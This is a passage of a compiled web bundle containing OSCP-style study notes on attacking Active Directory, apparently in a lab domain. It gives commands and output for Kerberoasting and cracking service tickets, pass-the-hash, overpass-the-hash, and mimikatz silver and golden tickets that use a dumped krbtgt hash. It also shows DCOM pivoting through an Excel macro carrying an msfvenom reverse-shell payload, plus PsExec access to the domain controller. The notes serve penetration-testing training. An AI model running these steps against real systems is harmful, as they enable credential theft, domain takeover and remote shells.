operator"}},[t._v("-")]),t._v("OutputFormat john "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("|")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("Select-Object")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("ExpandProperty hash "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("|")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$_")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("replace"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v("':'")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v("':$krb5tgs$23$'")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n")])])]),s("p",[t._v("Now to crack service tickets to find clear-text passwords for service accounts")]),t._v(" "),s("div",{staticClass:"language-sh extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sh"}},[s("code",[t._v("~/kerberoast"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("master*"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" » python3 tgsrepcrack.py rockyou-20.txt ~/OSCP-excercises/1-40a50000-offsec@HTTP"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("~CorpWebServer.corp.com-CORP.COM.kirbi                              omar2535@kali\n\n\nUSE HASHCAT, IT'S HELLA FASTER"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("!")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("!")]),t._v("\n\n\nCracking "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),t._v(" tickets"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("..")]),t._v(".\nfound password "),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("for")]),t._v(" ticket "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("0")]),t._v(": Qwerty09"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("!")]),t._v("  File: /home/omar2535/OSCP-excercises/1-40a50000-offsec@HTTP~CorpWebServer.corp.com-CORP.COM.kirbi\nSuccessfully cracked all tickets\n")])])]),s("h3",{attrs:{id:"pass-the-hash"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#pass-the-hash"}},[t._v("#")]),t._v(" Pass the Hash")]),t._v(" "),s("p",[t._v("Once the NTLM hash is retrieved, we can construct a pass the hash attack to elevate our priveleges using NTLM authentication.\nFor example, if our NTLM hash was "),s("code",[t._v("2892d26cdf84d7a70e2eb3b9f05c425e")]),t._v(", then our command to pass the hash would be")]),t._v(" "),s("div",{staticClass:"language-sh extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sh"}},[s("code",[s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# the following command will launch a rdesktop with that user's hash")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v('# the aad3b435b51404eeaad3b435b51404ee part after the userid means "no password"')]),t._v("\npth-winexe "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("-U")]),t._v(" offsec%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //192.168.194.10 cmd \n\nE_md4hash wrapper called.\nHASH PASS: Substituting user supplied NTLM HASH"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("..")]),t._v(".\nMicrosoft Windows "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("Version "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("10.0")]),t._v(".16299.15"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("c"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("2017")]),t._v(" Microsoft Corporation. All rights reserved.\nC:"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("Windows"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("system3"),s("span",{pre:!0,attrs:{class:"token operator"}},[s("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[t._v("2")]),t._v(">")]),t._v("\n")])])]),s("h3",{attrs:{id:"overpass-the-hash"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#overpass-the-hash"}},[t._v("#")]),t._v(" Overpass the hash")]),t._v(" "),s("p",[t._v("We can bypass NTLM authentication and get a TGT by passing the hash within mimikats like so:")]),t._v(" "),s("div",{staticClass:"language-sh extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sh"}},[s("code",[t._v("mimikatz "),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# sekurlsa::pth /user:jeff_admin /domain:corp.com /domain:corp.com /ntlm:2892d26cdf84d7a70e2eb3b9f05c425e /run:PowerShell.exe")]),t._v("\n")])])]),s("p",[t._v("and a powershell is spawned. To check our kerberos tickets:")]),t._v(" "),s("div",{staticClass:"language-powershell extra-class"},[s("pre",{pre:!0,attrs:{class:"language-powershell"}},[s("code",[t._v("> klist\n")])])]),s("p",[t._v("Now we can log into the domain controller using psexec like so:")]),t._v(" "),s("div",{staticClass:"language-powershell extra-class"},[s("pre",{pre:!0,attrs:{class:"language-powershell"}},[s("code",[s("span",{pre:!0,attrs:{class:"token function"}},[t._v("PS")]),t._v(" C:\\Tools\\active_directory> "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("\\PsExec"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("exe \\\\dc01 cmd"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("exe\n")])])]),s("h3",{attrs:{id:"creating-a-silver-ticket-to-authenticate-with"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#creating-a-silver-ticket-to-authenticate-with"}},[t._v("#")]),t._v(" Creating a silver ticket to authenticate with")]),t._v(" "),s("p",[t._v("First find the SID:")]),t._v(" "),s("div",{staticClass:"language-powershell extra-class"},[s("pre",{pre:!0,attrs:{class:"language-powershell"}},[s("code",[s("span",{pre:!0,attrs:{class:"token function"}},[t._v("PS")]),t._v(" C:\\Tools\\active_directory> whoami "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("user\n\nUSER INFORMATION\n"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("--")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("--")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("--")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("--")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("--")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("--")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("--")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("--")]),t._v("\n\nUser Name   SID\n=========== ==============================================\ncorp\\offsec S-1-5-21-4038953314-3014849035-1274281563-1103\n"),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("PS")]),t._v(" C:\\Tools\\active_directory> "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("\\mimikatz"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("exe\n")])])]),s("p",[t._v("Now purge all existing tickets")]),t._v(" "),s("div",{staticClass:"language-powershell extra-class"},[s("pre",{pre:!0,attrs:{class:"language-powershell"}},[s("code",[t._v("mimikatz "),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# kerberos::purge")]),t._v("\nmimikatz "),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# kerberos::list")]),t._v("\n")])])]),s("p",[t._v("Now create the new ticket with the sid's last portion cut off and the rc4 from the NTLM hash")]),t._v(" "),s("div",{staticClass:"language-powershell extra-class"},[s("pre",{pre:!0,attrs:{class:"language-powershell"}},[s("code",[t._v("mimikatz "),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# kerberos::golden /user:offsec /domain:corp.com /sid:S-1-5-21-4038953314-3014849035-1274281563 /target:CorpWebServer.corp.com /service:HTTP /rc4:2892d26cdf84d7a70e2eb3b9f05c425e /ptt")]),t._v("\n")])])]),s("h3",{attrs:{id:"distributed-component-object-model-pivoting"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#distributed-component-object-model-pivoting"}},[t._v("#")]),t._v(" Distributed Component Object model (Pivoting)")]),t._v(" "),s("p",[t._v("We can launch applications on another computer from a workstation with microsoft office installed.")]),t._v(" "),s("p",[t._v("First let's view the available methods and find if the "),s("code",[t._v("run")]),t._v(" method is available.")]),t._v(" "),s("p",[t._v("Ip addresss of remote workstation: 172.16.194.5")]),t._v(" "),s("div",{staticClass:"language-powershell extra-class"},[s("pre",{pre:!0,attrs:{class:"language-powershell"}},[s("code",[s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$com")]),t._v(" = "),s("span",{pre:!0,attrs:{class:"token namespace"}},[t._v("[activator]")]),t._v("::CreateInstance"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token namespace"}},[t._v("[type]")]),t._v("::GetTypeFromProgId"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"Excel.Application"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"172.16.194.5"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$com")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("|")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("Get-Member")]),t._v("\n")])])]),s("p",[t._v("Now create the excel macro")]),t._v(" "),s("div",{staticClass:"language-sh extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sh"}},[s("code",[t._v("msfvenom "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("-p")]),t._v(" windows/shell_reverse_tcp "),s("span",{pre:!0,attrs:{class:"token assign-left variable"}},[t._v("LHOST")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("192.168")]),t._v(".194.10 "),s("span",{pre:!0,attrs:{class:"token assign-left variable"}},[t._v("LPORT")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("5555")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("-f")]),t._v(" vba-psh "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" new_payload.txt\n"),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("cat")]),t._v(" new_payload.txt\n")])])]),s("p",[t._v("copy it to the remote computer")]),t._v(" "),s("div",{staticClass:"language-powershell extra-class"},[s("pre",{pre:!0,attrs:{class:"language-powershell"}},[s("code",[s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$LocalPath")]),t._v(" = "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"C:\\Users\\jeff_admin\\Documents\\myexcel.xls"')]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$RemotePath")]),t._v(" = "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"\\\\172.16.194.5\\c$\\myexcel.xls"')]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token namespace"}},[t._v("[System.IO.File]")]),t._v("::"),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("Copy")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$LocalPath")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$RemotePath")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token boolean"}},[t._v("$True")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n")])])]),s("p",[t._v("Now open the excel file from our machine by creating a system profile on the remote machine then running it")]),t._v(" "),s("div",{staticClass:"language-powershell extra-class"},[s("pre",{pre:!0,attrs:{class:"language-powershell"}},[s("code",[s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$com")]),t._v(" = "),s("span",{pre:!0,attrs:{class:"token namespace"}},[t._v("[activator]")]),t._v("::CreateInstance"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token namespace"}},[t._v("[type]")]),t._v("::GetTypeFromProgId"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"Excel.Application"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"172.16.194.5"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n\n"),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$Path")]),t._v(" = "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"\\\\172.16.194.5\\c$\\Windows\\sysWOW64\\config\\systemprofile\\Desktop"')]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$temp")]),t._v(" = "),s("span",{pre:!0,attrs:{class:"token namespace"}},[t._v("[system.io.directory]")]),t._v("::createDirectory"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$Path")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n\n"),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$Workbook")]),t._v(" = "),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$com")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("Workbooks"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("Open"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"C:\\myexcel.xls"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n\n"),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$com")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("Run"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"mymacro"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$com")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("Run"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"Workbook_Open"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$com")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("Run"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"mOaoZH8"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$com")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("Run"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"AutoOpen"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n")])])]),s("h3",{attrs:{id:"creating-a-golden-ticket-to-psexec-on-domain-controller"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#creating-a-golden-ticket-to-psexec-on-domain-controller"}},[t._v("#")]),t._v(" Creating a golden ticket to psexec on domain controller")]),t._v(" "),s("p",[t._v("Go into the domain controller and grab the NTLM hash")]),t._v(" "),s("div",{staticClass:"language-powershell extra-class"},[s("pre",{pre:!0,attrs:{class:"language-powershell"}},[s("code",[s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# On the domain controller:")]),t._v("\nC:\\Tools>mimikatz"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("exe\n\n  "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("#####.   mimikatz 2.2.0 (x64) #18362 May 13 2019 01:35:04")]),t._v("\n "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v('## ^ ##.  "A La Vie, A L\'Amour" - (oe.eo)')]),t._v("\n "),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )")]),t._v("\n "),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("## \\ / ##       > http://blog.gentilkiwi.com/mimikatz")]),t._v("\n "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v("'## v ##'")]),t._v("       Vincent LE TOUX             "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v(" vincent"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("letoux@gmail"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("com "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n  "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v("'#####'")]),t._v("        > http:"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("pingcastle"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("com "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v(" http:"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("mysmartlogon"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("com   "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("*")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("*")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("*")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("\n\nmimikatz "),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# privilege::debug")]),t._v("\nPrivilege "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v("'20'")]),t._v(" OK\n\nmimikatz "),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# lsadump::lsa /patch")]),t._v("\n\nRID  : 000001f6 "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("502"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\nUser : krbtgt\nLM   :\nNTLM : fc274a94b36874d2560a7bd332604fab\n")])])]),s("p",[t._v("Now on the workstation:")]),t._v(" "),s("p",[t._v("Find the SID first using "),s("code",[t._v("whoami /user")]),t._v(" without the last part after the "),s("code",[t._v("-")]),t._v(".")]),t._v(" "),s("div",{staticClass:"language-powershell extra-class"},[s("pre",{pre:!0,attrs:{class:"language-powershell"}},[s("code",[t._v("C:\\Tools>mimikatz"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("exe\n\n  "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("#####.   mimikatz 2.2.0 (x64) #18362 May 13 2019 01:35:04")]),t._v("\n "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v('## ^ ##.  "A La Vie, A L\'Amour" - (oe.eo)')]),t._v("\n "),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )")]),t._v("\n "),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("## \\ / ##       > http://blog.gentilkiwi.com/mimikatz")]),t._v("\n "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v("'## v ##'")]),t._v("       Vincent LE TOUX             "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v(" vincent"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("letoux@gmail"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("com "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n  "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v("'#####'")]),t._v("        > http:"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("pingcastle"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("com "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v(" http:"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("mysmartlogon"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("com   "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("*")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("*")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("*")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("\n\nmimikatz "),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# privilege::debug")]),t._v("\nPrivilege "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v("'20'")]),t._v(" OK\n\nmimikatz "),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# kerberos::purge")]),t._v("\nTicket"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("s"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" purge "),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("for")]),t._v(" current session is OK\n\nmimikatz "),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# kerberos::golden /user:fakeuser /domain:corp.com /sid:S-1-5-21-4038953314-3014849035-1274281563 /krbtgt:fc274a94b36874d2560a7bd332604fab /ptt")]),t._v("\n")])])]),s("p",[t._v("Now we can launch a command prompt on the domain controller using "),s("code",[t._v("psexec")]),t._v(" like so:")]),t._v(" "),s("div",{staticClass:"language-sh extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sh"}},[s("code",[t._v("C:"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("Windows"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("system3"),s("span",{pre:!0,attrs:{class:"token operator"}},[s("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[t._v("2")]),t._v(">")]),t._v("cd C:"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("Tools"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("active_directory\n\nC:"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("Tools"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("active_directory"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v("PsExec.exe "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("dc01 cmd.exe\n\nPsExec v2.2 - Execute processes remotely\nCopyright "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("C"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("2001")]),t._v("-2016 Mark Russinovich\nSysinternals - www.sysinternals.com\n\n\nMicrosoft Windows "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("Version "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("10.0")]),t._v(".14393"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("c"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("2016")]),t._v(" Microsoft Corporation. All rights reserved.\n\nC:"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("Windows"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("system3"),s("span",{pre:!0,attrs:{class:"token operator"}},[s("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[t._v("2")]),t._v(">")]),t._v("whoami\ncorp"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("fakeuser\n")])])]),s("h2",{attrs:{id:"password-cracking"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#password-cracking"}},[t._v("#")]),t._v(" Password cracking")]),t._v(" "),s("h3",{attrs:{id:"hash-identifier"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#hash-identifier"}},[t._v("#")]),t._v(" Hash identifier")]),t._v(" "),s("div",{staticClass:"language-sh extra-class"},[s("pre",{pre:!0,attrs:{class:"language-sh"}},[s("code",[t._v("hash-identifier AAFDC23870ECBCD3D557B6423A8982134E17927E\n")])])])])}),[],!1,null,null,null);s.default=r.exports}}]);